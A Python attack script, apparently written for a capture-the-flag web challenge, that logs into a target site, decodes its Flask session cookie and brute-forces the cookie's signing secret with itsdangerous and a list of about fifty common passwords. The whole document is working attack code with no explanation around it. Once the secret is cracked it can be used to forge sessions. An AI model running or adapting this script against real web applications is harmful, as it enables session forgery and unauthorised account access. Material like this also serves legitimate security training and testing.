import requests, base64, zlib, json, hashlib, hmac, struct, time, sys

base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()
s.post(f'{base}/register', data={'username':'hacker5000','password':'pass5000'}, allow_redirects=False)
r = s.post(f'{base}/login', data={'username':'hacker5000','password':'pass5000'}, allow_redirects=False)
cookie = s.cookies.get('session')
print('Cookie:', cookie)

# Parse cookie parts (empty, compressed_data, timestamp, signature)
parts = cookie.split('.')
print('Parts:', len(parts))
for i, p in enumerate(parts):
    print(f'  Part {i}: len={len(p)}')

# The payload is part[1] (compressed)
padded = parts[1] + '=' * (4 - len(parts[1]) % 4) if len(parts[1]) % 4 else parts[1]
payload_data = base64.urlsafe_b64decode(padded)
print('Payload compressed:', payload_data[:20], '...' if len(payload_data)>20 else '')
session_data = zlib.decompress(payload_data)
print('Session data:', session_data)

# Try to brute force secret
from itsdangerous import URLSafeTimedSerializer, Signer, TimestampSigner
from itsdangerous.exc import BadSignature

# Build timestamp from part 2
ts_bytes = base64.urlsafe_b64decode(parts[2] + '='*(4-len(parts[2])%4))
ts = struct.unpack('>I', ts_bytes)[0]
print('Timestamp:', ts, '->', time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(ts)))

# Common secrets to try
secrets = ['secret', 'tom', 'jerry', 'cheese', 'flask', 'changeme', 'password', 'admin', 'key', '123456', 'test', 'dev', 'production', 'CTF', 'flag', 'tomjerry', 'jerrytom', 'lucky', 'draw', 'grandmeal', 'cheeseshop', 'random', 'tomandjerry', 'tom_and_jerry', 'cheese123', 'secretkey', 'app', 'supersecret', 'default', 'development', 'testkey', 'debug', '123', '1234', '12345', '1234567890', 'qwerty', 'abc', 'abc123', 'letmein', 'monkey', 'dragon', 'master', 'admin123', 'p@ssw0rd', 'root123', 'temp123', 's3cr3t', 'SECRET', 'flask-secret']

for secret in secrets:
    try:
        s = URLSafeTimedSerializer(secret_key=secret, salt='cookie-session', signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1})
        data = s.loads(cookie)
        print(f'CRACKED! Secret: {secret}')
        print('Data:', data)
        break
    except:
        pass
else:
    print('No common secret found')
